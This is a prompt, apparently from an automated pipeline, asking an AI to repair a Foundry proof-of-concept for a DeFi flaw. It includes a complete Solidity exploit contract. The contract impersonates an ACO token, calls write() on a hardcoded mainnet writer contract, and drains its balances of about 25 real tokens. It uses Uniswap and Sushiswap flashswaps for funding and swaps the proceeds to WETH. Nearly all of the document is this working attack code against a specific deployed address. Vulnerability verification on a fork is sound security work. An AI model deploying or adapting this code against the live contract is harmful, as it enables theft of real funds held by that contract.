You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Unverified ACO tokens let attackers sweep arbitrary writer-held ERC20 balances
- claim: `write()` trusts the caller-supplied `acoToken` for `collateral()`, `strikeAsset()`, and mint behavior. A malicious token can make `transferFrom`/`mintTo` succeed without moving real collateral, then `_sellACOTokens()` uses the untrusted `strikeAsset()` value and transfers the writer's entire balance of that token to the caller.
- impact: Any ERC20 balance already resident in the writer, including WETH or stablecoins, can be permissionlessly drained without supplying real collateral or selling real option tokens.
- exploit_paths: ["Deploy a fake token that implements the expected interface, returns a malicious collateral token that always reports successful `transferFrom`, and reports the target asset from `strikeAsset()`", "Call `write(fakeToken, 1, attackerEOA, \"\")` while sending the minimum ETH required by `write()`", "`_sellACOTokens()` succeeds, then transfers the writer's full balance of the chosen strike asset to the attacker"]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
}

interface IWETH9 is IERC20Minimal {
    function deposit() external payable;
    function withdraw(uint256 value) external;
}

interface IACOWriterLike {
    function write(address acoToken, uint256 collateralAmount, address exchangeAddress, bytes calldata exchangeData) external payable;
    function weth() external view returns (address);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract FlawVerifier {
    address public constant TARGET = 0xE7597F774fD0a15A617894dc39d45A28B97AFa4f;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address internal constant UNISWAP_V2_WETH_USDC_PAIR = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    address internal constant SUSHISWAP_WETH_USDC_PAIR = 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address internal constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address internal constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address internal constant SNX = 0xC011A72400E58ecD99Ee497CF89E3775d4bd732F;
    address internal constant MKR = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
    address internal constant YFI = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;
    address internal constant BAL = 0xba100000625a3754423978a60c9317c58a424e3D;
    address internal constant FEI = 0x956F47F50A910163D8BF957Cf5846D573E7f87CA;
    address internal constant RAI = 0x03ab458634910AaD20eF5f1C8ee96F1D6ac54919;
    address internal constant BOND = 0x0391D2021f89DC339F60Fff84546EA23E337750f;
    address internal constant SPELL = 0x090185f2135308BaD17527004364eBcC2D37e5F6;

    uint256 internal constant COLLATERAL_AMOUNT = 1;
    uint256 internal constant CALL_SEED_ETH = 1;
    uint256 internal constant FLASH_BORROW_WETH = 1 ether;

    uint8 public constant STATUS_UNSET = 0;
    uint8 public constant STATUS_DIRECT_SUCCESS = 1;
    uint8 public constant STATUS_FLASH_SUCCESS = 2;
    uint8 public constant STATUS_NO_WRITER_BALANCE = 3;
    uint8 public constant STATUS_FLASH_FAILED = 4;
    uint8 public constant STATUS_NO_REPAY_PATH = 5;

    uint8 public status;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    address public lastTargetToken;
    bytes public lastWriteFailure;
    uint256 public successfulSweeps;

    bool internal _entered;
    bool internal _baselineCaptured;
    uint256 internal _baselineEthBalance;
    address internal _configuredStrikeAsset;

    mapping(address => uint256) internal _baselineTokenBalance;
    mapping(address => uint256) internal _forgedAcoBalance;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_entered) {
            return;
        }
        _entered = true;

        if (!_baselineCaptured) {
            _captureBaseline();
        }

        if (!_writerHasCandidateBalance()) {
            status = STATUS_NO_WRITER_BALANCE;
            _entered = false;
            return;
        }

        if (_prepareEthSeed()) {
            _runExploitSequence();
            if (successfulSweeps > 0) {
                status = STATUS_DIRECT_SUCCESS;
                hypothesisValidated = true;
            }
            _entered = false;
            return;
        }

        bool flashOk = _tryFlashswapSeed(UNISWAP_V2_WETH_USDC_PAIR);
        if (!flashOk) {
            flashOk = _tryFlashswapSeed(SUSHISWAP_WETH_USDC_PAIR);
        }
        if (!flashOk && status == STATUS_UNSET) {
            status = STATUS_FLASH_FAILED;
        }

        _entered = false;
    }

    function profitToken() external view returns (address) {
        (address token,) = _currentProfit();
        return token;
    }

    function profitAmount() external view returns (uint256) {
        (, uint256 amount) = _currentProfit();
        return amount;
    }

    function exploitPath() external pure returns (string memory) {
        return "deploy one malicious verifier contract that also serves as the fake ACO/collateral surface -> call write(address(this),1,tx.origin,\"\") with 1 wei -> writer trusts this contract's collateral()/transferFrom()/mintTo() without moving real collateral -> _sellACOTokens reads forged strikeAsset() and transfers the writer's full balance of that existing on-chain token to the verifier";
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == UNISWAP_V2_WETH_USDC_PAIR || msg.sender == SUSHISWAP_WETH_USDC_PAIR, "unexpected pair");

        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
        require(borrowedWeth > 0, "unexpected amount");

        if (address(this).balance < CALL_SEED_ETH) {
            IWETH9(WETH).withdraw(CALL_SEED_ETH);
        }

        _runExploitSequence();
        _repayFlashswap(msg.sender, borrowedWeth);

        if (successfulSweeps > 0) {
            status = STATUS_FLASH_SUCCESS;
            hypothesisValidated = true;
        }
    }

    function collateral() external view returns (address) {
        return address(this);
    }

    function strikeAsset() external view returns (address) {
        return _configuredStrikeAsset;
    }

    function expiryTime() external pure returns (uint256) {
        return type(uint256).max;
    }

    function getTokenAmount(uint256 collateralAmount) external pure returns (uint256) {
        return collateralAmount;
    }

    function mintTo(address, uint256 collateralAmount) external {
        _forgedAcoBalance[msg.sender] += collateralAmount;
    }

    function mintToPayable(address) external payable {
        _forgedAcoBalance[msg.sender] += msg.value;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _forgedAcoBalance[account];
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function _runExploitSequence() internal {
        address[25] memory candidates = _candidateTokens();
        for (uint256 i = 0; i < candidates.length; ++i) {
            address token = candidates[i];
            if (token == address(0) || token.code.length == 0) {
                continue;
            }

            uint256 writerBalance = _balanceOfIfPossible(token, TARGET);
            if (writerBalance == 0) {
                continue;
            }

            _configuredStrikeAsset = token;
            lastTargetToken = token;

            (bool ok, bytes memory reason) = TARGET.call{value: CALL_SEED_ETH}(
                abi.encodeWithSelector(
                    IACOWriterLike.write.selector,
                    address(this),
                    COLLATERAL_AMOUNT,
                    tx.origin,
                    bytes("")
                )
            );

            if (ok) {
                ++successfulSweeps;
                hypothesisValidated = true;
            } else {
                lastWriteFailure = reason;
            }
        }
    }

    function _repayFlashswap(address pair, uint256 borrowedWeth) internal {
        uint256 repayAmount = borrowedWeth + (((borrowedWeth * 3) / 997) + 1);

        if (_balanceOfIfPossible(WETH, address(this)) < repayAmount) {
            _swapAllToWeth();
        }

        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            IWETH9(WETH).deposit{value: ethBalance}();
        }

        uint256 wethBalance = _balanceOfIfPossible(WETH, address(this));
        if (wethBalance < repayAmount) {
            status = STATUS_NO_REPAY_PATH;
            revert("repayment unavailable");
        }

        _safeTransfer(WETH, pair, repayAmount);
    }

    function _swapAllToWeth() internal {
        address[25] memory candidates = _candidateTokens();
        for (uint256 i = 0; i < candidates.length; ++i) {
            address token = candidates[i];
            if (token == WETH || token == address(0) || token.code.length == 0) {
                continue;
            }

            uint256 balance = _balanceOfIfPossible(token, address(this));
            if (balance == 0) {
                continue;
            }

            _swapTokenToTargetIfPossible(token, WETH, balance);
        }
    }

    function _prepareEthSeed() internal returns (bool) {
        if (address(this).balance >= CALL_SEED_ETH) {
            return true;
        }

        if (_balanceOfIfPossible(WETH, address(this)) >= CALL_SEED_ETH) {
            IWETH9(WETH).withdraw(CALL_SEED_ETH);
            return address(this).balance >= CALL_SEED_ETH;
        }

        return false;
    }

    function _writerHasCandidateBalance() internal view returns (bool) {
        address[25] memory candidates = _candidateTokens();
        for (uint256 i = 0; i < candidates.length; ++i) {
            if (_balanceOfIfPossible(candidates[i], TARGET) > 0) {
                return true;
            }
        }
        return false;
    }

    function _tryFlashswapSeed(address pair) internal returns (bool ok) {
        if (pair.code.length == 0) {
            return false;
        }

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        if (token0 != WETH && token1 != WETH) {
            return false;
        }

        (ok,) = pair.call(
            abi.encodeWithSelector(
                IUniswapV2Pair.swap.selector,
                token0 == WETH ? FLASH_BORROW_WETH : 0,
                token1 == WETH ? FLASH_BORROW_WETH : 0,
                address(this),
                abi.encode(uint256(1))
            )
        );
    }

    function _currentProfit() internal view returns (address token, uint256 amount) {
        uint256 wethBalance = _netTokenBalance(WETH);
        if (wethBalance > 0) {
            return (WETH, wethBalance);
        }

        uint256 daiBalance = _netTokenBalance(DAI);
        if (daiBalance > 0) {
            return (DAI, daiBalance);
        }

        uint256 usdcBalance = _netTokenBalance(USDC);
        if (usdcBalance > 0) {
            return (USDC, usdcBalance);
        }

        uint256 usdtBalance = _netTokenBalance(USDT);
        if (usdtBalance > 0) {
            return (USDT, usdtBalance);
        }

        address[25] memory candidates = _candidateTokens();
        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 balance = _netTokenBalance(candidates[i]);
            if (balance > 0) {
                return (candidates[i], balance);
            }
        }

        uint256 ethProfit = address(this).balance > _baselineEthBalance ? address(this).balance - _baselineEthBalance : 0;
        return (address(0), ethProfit);
    }

    function _captureBaseline() internal {
        _baselineCaptured = true;
        _baselineEthBalance = address(this).balance;

        address[25] memory candidates = _candidateTokens();
        for (uint256 i = 0; i < candidates.length; ++i) {
            address token = candidates[i];
            if (token != address(0) && token.code.length > 0) {
                _baselineTokenBalance[token] = _balanceOfIfPossible(token, address(this));
            }
        }
    }

    function _netTokenBalance(address token) internal view returns (uint256) {
        uint256 current = _balanceOfIfPossible(token, address(this));
        uint256 baseline = _baselineTokenBalance[token];
        if (current <= baseline) {
            return 0;
        }
        return current - baseline;
    }

    function _swapTokenToTargetIfPossible(address tokenIn, address tokenOut, uint256 amountIn) internal {
        if (amountIn == 0 || tokenIn == tokenOut) {
            return;
        }

        uint256 directOut = _bestSingleHopOut(tokenIn, tokenOut, amountIn);
        uint256 usdcOut = _bestTwoHopOut(tokenIn, USDC, tokenOut, amountIn);
        uint256 usdtOut = _bestTwoHopOut(tokenIn, USDT, tokenOut, amountIn);
        uint256 daiOut = _bestTwoHopOut(tokenIn, DAI, tokenOut, amountIn);

        if (directOut >= usdcOut && directOut >= usdtOut && directOut >= daiOut) {
            _swapSingleHopIfPossible(tokenIn, tokenOut, amountIn);
            return;
        }
        if (usdcOut >= usdtOut && usdcOut >= daiOut) {
            _swapTwoHopIfPossible(tokenIn, USDC, tokenOut, amountIn);
            return;
        }
        if (usdtOut >= daiOut) {
            _swapTwoHopIfPossible(tokenIn, USDT, tokenOut, amountIn);
            return;
        }
        _swapTwoHopIfPossible(tokenIn, DAI, tokenOut, amountIn);
    }

    function _bestSingleHopOut(address tokenIn, address tokenOut, uint256 amountIn) internal view returns (uint256 bestOut) {
        address uniPair = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(tokenIn, tokenOut);
        address sushiPair = IUniswapV2Factory(SUSHISWAP_FACTORY).getPair(tokenIn, tokenOut);

        if (uniPair != address(0) && uniPair.code.length > 0) {
            uint256 uniOut = _quoteOut(uniPair, tokenIn, tokenOut, amountIn);
            if (uniOut > bestOut) {
                bestOut = uniOut;
            }
        }
        if (sushiPair != address(0) && sushiPair.code.length > 0) {
            uint256 sushiOut = _quoteOut(sushiPair, tokenIn, tokenOut, amountIn);
            if (sushiOut > bestOut) {
                bestOut = sushiOut;
            }
        }
    }

    function _bestTwoHopOut(address tokenIn, address bridge, address tokenOut, uint256 amountIn) internal view returns (uint256) {
        if (tokenIn == bridge || bridge == tokenOut || tokenIn == tokenOut) {
            return 0;
        }

        uint256 bridgeAmount = _bestSingleHopOut(tokenIn, bridge, amountIn);
        if (bridgeAmount == 0) {
            return 0;
        }

        return _bestSingleHopOut(bridge, tokenOut, bridgeAmount);
    }

    function _swapSingleHopIfPossible(address tokenIn, address tokenOut, uint256 amountIn) internal {
        address uniPair = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(tokenIn, tokenOut);
        address sushiPair = IUniswapV2Factory(SUSHISWAP_FACTORY).getPair(tokenIn, tokenOut);

        address bestPair = address(0);
        uint256 bestOut = 0;

        if (uniPair != address(0) && uniPair.code.length > 0) {
            uint256 uniOut = _quoteOut(uniPair, tokenIn, tokenOut, amountIn);
            if (uniOut > bestOut) {
                bestOut = uniOut;
                bestPair = uniPair;
            }
        }

        if (sushiPair != address(0) && sushiPair.code.length > 0) {
            uint256 sushiOut = _quoteOut(sushiPair, tokenIn, tokenOut, amountIn);
            if (sushiOut > bestOut) {
                bestOut = sushiOut;
                bestPair = sushiPair;
            }
        }

        if (bestPair != address(0) && bestOut > 0) {
            _swapExactOnPair(bestPair, tokenIn, amountIn, bestOut);
        }
    }

    function _swapTwoHopIfPossible(address tokenIn, address bridge, address tokenOut, uint256 amountIn) internal {
        if (tokenIn == bridge || bridge == tokenOut || tokenIn == tokenOut) {
            return;
        }

        address firstPair = _bestPair(tokenIn, bridge, amountIn);
        if (firstPair == address(0)) {
            return;
        }

        uint256 bridgeOut = _quoteOut(firstPair, tokenIn, bridge, amountIn);
        if (bridgeOut == 0) {
            return;
        }
        _swapExactOnPair(firstPair, tokenIn, amountIn, bridgeOut);

        uint256 bridgeBalance = _balanceOfIfPossible(bridge, address(this));
        if (bridgeBalance == 0) {
            return;
        }

        address secondPair = _bestPair(bridge, tokenOut, bridgeBalance);
        if (secondPair == address(0)) {
            return;
        }

        uint256 tokenOutAmount = _quoteOut(secondPair, bridge, tokenOut, bridgeBalance);
        if (tokenOutAmount == 0) {
            return;
        }
        _swapExactOnPair(secondPair, bridge, bridgeBalance, tokenOutAmount);
    }

    function _bestPair(address tokenIn, address tokenOut, uint256 amountIn) internal view returns (address bestPair) {
        address uniPair = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(tokenIn, tokenOut);
        address sushiPair = IUniswapV2Factory(SUSHISWAP_FACTORY).getPair(tokenIn, tokenOut);
        uint256 bestOut = 0;

        if (uniPair != address(0) && uniPair.code.length > 0) {
            uint256 uniOut = _quoteOut(uniPair, tokenIn, tokenOut, amountIn);
            if (uniOut > bestOut) {
                bestOut = uniOut;
                bestPair = uniPair;
            }
        }

        if (sushiPair != address(0) && sushiPair.code.length > 0) {
            uint256 sushiOut = _quoteOut(sushiPair, tokenIn, tokenOut, amountIn);
            if (sushiOut > bestOut) {
                bestOut = sushiOut;
                bestPair = sushiPair;
            }
        }
    }

    function _swapExactOnPair(address pair, address tokenIn, uint256 amountIn, uint256 amountOut) internal {
        _safeTransfer(tokenIn, pair, amountIn);

        address token0 = IUniswapV2Pair(pair).token0();
        (uint256 amount0Out, uint256 amount1Out) =
            token0 == tokenIn ? (uint256(0), amountOut) : (amountOut, uint256(0));
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), new bytes(0));
    }

    function _quoteOut(address pair, address tokenIn, address tokenOut, uint256 amountIn) internal view returns (uint256) {
        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        if (!((token0 == tokenIn && token1 == tokenOut) || (token0 == tokenOut && token1 == tokenIn))) {
            return 0;
        }

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        (uint256 reserveIn, uint256 reserveOut) =
            token0 == tokenIn ? (uint256(reserve0), uint256(reserve1)) : (uint256(reserve1), uint256(reserve0));

        if (reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
    }

    function _balanceOfIfPossible(address token, address account) internal view returns (uint256) {
        if (token == address(0) || token.code.length == 0) {
            return 0;
        }

        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Minimal.balanceOf.selector, account));
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _candidateTokens() internal pure returns (address[25] memory list) {
        list[0] = WETH;
        list[1] = DAI;
        list[2] = USDC;
        list[3] = USDT;
        list[4] = WBTC;
        list[5] = LINK;
        list[6] = AAVE;
        list[7] = CRV;
        list[8] = SNX;
        list[9] = MKR;
        list[10] = YFI;
        list[11] = BAL;
        list[12] = FEI;
        list[13] = RAI;
        list[14] = BOND;
        list[15] = SPELL;
        list[16] = 0xB05B83f1aAB0036f9DADFDb18405da3D459C1f1c;
        list[17] = 0x160e753EEfe29eA3aC186bF27588Ac9AcA2F6139;
        list[18] = 0xfF5B7c52245625b399D2E2927F52A8da86264a33;
        list[19] = 0xc3eAb6960e0Cd51dCf304248e4BBB08d8eeAb552;
        list[20] = 0x9B297790cD8540876a04543499528835F1Cea175;
        list[21] = 0x58ea371c3D7BCA0ED0C3a4e4DC9bb92702310489;
        list[22] = 0xB51A09c53D7cC6481E4C5d9d8d334A6e50776ecf;
        list[23] = 0x049D17c3d5ba37429dE4D414A603127F1090FFa7;
        list[24] = 0xc12d099be31567add4e4e4d0D45691C3F58f5663;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: write(faketoken, 1, attackereoa, ""), write(), _sellacotokens(); generated code does not cover paths indexes: 1, 2
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
